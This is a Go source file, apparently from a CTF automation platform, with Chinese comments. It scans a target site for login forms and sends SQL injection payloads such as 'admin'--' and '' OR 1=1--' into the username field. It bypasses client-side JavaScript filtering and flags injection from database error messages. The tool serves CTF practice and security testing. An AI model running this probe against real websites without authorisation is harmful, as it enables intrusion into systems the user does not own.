package ctfplatform

// web_evidence_sqli.go —— 报错型 SQL 注入的"打穿证据"探测。
//
// 与 web_evidence.go 同一设计原则：旁路能力，不产生 WebFinding、不参与 flag 判分。
//
// 动机（LAMPSecurity CTF4 实测）：/admin/index.php 的登录表单在前端用 JS 剥掉所有
// 非字母数字字符（fixLogin()），浏览器里根本打不出注入；但**绕过 JS 直接 POST**
// `admin'--` 会触发 MySQL 语法报错。这类"报错回显"是无需 flag 就能判定的硬证据。

import (
	"context"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// loginForm 描述一个带口令输入的登录表单。
type loginForm struct {
	Action    string // 已解析为绝对 URL
	UserField string // 用户名/账号字段名
	PassField string // 口令字段名
}

var (
	reFormBlock = regexp.MustCompile(`(?is)<form[^>]*>.*?</form>`)
	reFormOpen  = regexp.MustCompile(`(?is)<form[^>]*>`)
	reAction    = regexp.MustCompile(`(?i)action\s*=\s*["']([^"']*)["']`)
	reInputTag  = regexp.MustCompile(`(?is)<input[^>]*>`)
	reNameAttr  = regexp.MustCompile(`(?i)name\s*=\s*["']([^"']+)["']`)
	reTypeAttr  = regexp.MustCompile(`(?i)type\s*=\s*["']([^"']+)["']`)

	// sqlErrorSigs 是各数据库的**报错回显**特征，命中即证明注入生效。
	sqlErrorSigs = []struct {
		db string
		re *regexp.Regexp
	}{
		{"mysql", regexp.MustCompile(`(?i)you have an error in your sql syntax`)},
		{"mysql", regexp.MustCompile(`(?i)warning\s*:.{0,40}mysql_`)},
		{"mssql", regexp.MustCompile(`(?i)unclosed quotation mark after the character string`)},
		{"mssql", regexp.MustCompile(`(?i)incorrect syntax near`)},
		{"oracle", regexp.MustCompile(`\bORA-\d{4,5}\b`)},
		{"pgsql", regexp.MustCompile(`(?i)postgresql.{0,20}error`)},
		{"sqlite", regexp.MustCompile(`(?i)sqlite3?\.(?:operationalerror|error)`)},
		{"generic", regexp.MustCompile(`(?i)sqlstate\[`)},
	}

	// sqliErrorPayloads 是触发语法错误的载荷（不追求取数，只要"能证明注入"）。
	sqliErrorPayloads = []string{"'", `"`, `\`, "admin'", "' OR 1=1--", "1'", "admin'--"}
)

// classifySQLError 判断响应里是否含数据库报错，返回数据库类型。
func classifySQLError(body []byte) (db string, ok bool) {
	text := string(body)
	for _, s := range sqlErrorSigs {
		if s.re.MatchString(text) {
			return s.db, true
		}
	}
	return "", false
}

// discoverLoginForms 从页面里找出带口令输入的表单，解析 action 与字段名。
func discoverLoginForms(ctx context.Context, cl *http.Client, pageURL string) []loginForm {
	code, body, _, err := webFetch(ctx, cl, pageURL)
	if err != nil || code <= 0 {
		return nil
	}
	text := string(body)
	var out []loginForm
	for _, block := range reFormBlock.FindAllString(text, 10) {
		// 必须有口令输入框，否则不是登录表单
		hasPass := false
		var passField string
		var names []string
		for _, in := range reInputTag.FindAllString(block, 20) {
			typ := ""
			if m := reTypeAttr.FindStringSubmatch(in); len(m) > 1 {
				typ = strings.ToLower(m[1])
			}
			nm := ""
			if m := reNameAttr.FindStringSubmatch(in); len(m) > 1 {
				nm = m[1]
			}
			if typ == "password" {
				hasPass = true
				passField = nm
				continue
			}
			if nm != "" {
				names = append(names, nm)
			}
		}
		if !hasPass || passField == "" {
			continue
		}
		action := ""
		if m := reAction.FindStringSubmatch(reFormOpen.FindString(block)); len(m) > 1 {
			action = strings.TrimSpace(m[1])
		}
		if action == "" {
			action = pageURL
		} else if !strings.HasPrefix(action, "http") {
			base, err := url.Parse(pageURL)
			if err == nil {
				ref, err2 := url.Parse(action)
				if err2 == nil {
					action = base.ResolveReference(ref).String()
				}
			}
		}
		userField := ""
		for _, n := range names {
			ln := strings.ToLower(n)
			if strings.Contains(ln, "user") || strings.Contains(ln, "login") || strings.Contains(ln, "account") || strings.Contains(ln, "name") {
				userField = n
				break
			}
		}
		if userField == "" && len(names) > 0 {
			userField = names[0]
		}
		if userField == "" {
			continue
		}
		out = append(out, loginForm{Action: action, UserField: userField, PassField: passField})
	}
	return out
}

// ProbeSQLError 探测报错型 SQL 注入，返回非 flag 型证据。
// 先跑基线（良性凭据）——若基线本身就报错，说明该表单已坏，跳过以免误报。
func ProbeSQLError(ctx context.Context, baseURL string, hints WebHints) []WebEvidence {
	cl := webClient(8 * time.Second)

	// 候选登录页：线索端点 + 常见后台路径 + 根路径
	pages := append([]string{}, hints.Endpoints...)
	pages = append(pages, "/admin/", "/admin/index.php", "/login.php", "/")
	if len(pages) > 8 {
		pages = pages[:8]
	}

	b := strings.TrimSuffix(baseURL, "/")
	var out []WebEvidence
	seenForm := map[string]bool{}
	budget := 40

	for _, p := range pages {
		if budget <= 0 || len(out) >= 3 {
			break
		}
		pageURL := b + "/" + strings.TrimPrefix(p, "/")
		forms := discoverLoginForms(ctx, cl, pageURL)
		for _, f := range forms {
			if budget <= 0 || len(out) >= 3 {
				break
			}
			key := f.Action + "|" + f.UserField
			if seenForm[key] {
				continue
			}
			seenForm[key] = true

			// 基线：良性凭据不应报错
			_, baseBody, _, err := webPostForm(ctx, cl, f.Action, url.Values{
				f.UserField: {"nosuchuser_zz"}, f.PassField: {"nosuchpass_zz"},
			})
			budget--
			if err != nil {
				continue
			}
			if _, bad := classifySQLError(baseBody); bad {
				continue // 基线已报错，判定不可靠
			}

			for _, pl := range sqliErrorPayloads {
				if budget <= 0 {
					break
				}
				_, body, _, err := webPostForm(ctx, cl, f.Action, url.Values{
					f.UserField: {pl}, f.PassField: {"x"},
				})
				budget--
				if err != nil {
					continue
				}
				db, hit := classifySQLError(body)
				if !hit {
					continue
				}
				out = append(out, WebEvidence{
					Kind:    "sqli_error",
					URL:     f.Action,
					Param:   f.UserField,
					Payload: pl,
					Signal:  "sqli_error_" + db,
					Detail:  "字段 " + f.UserField + " 触发 " + strings.ToUpper(db) + " 语法报错（报错原文不回显）",
				})
				break // 同一表单命中一次即可
			}
		}
	}
	return out
}
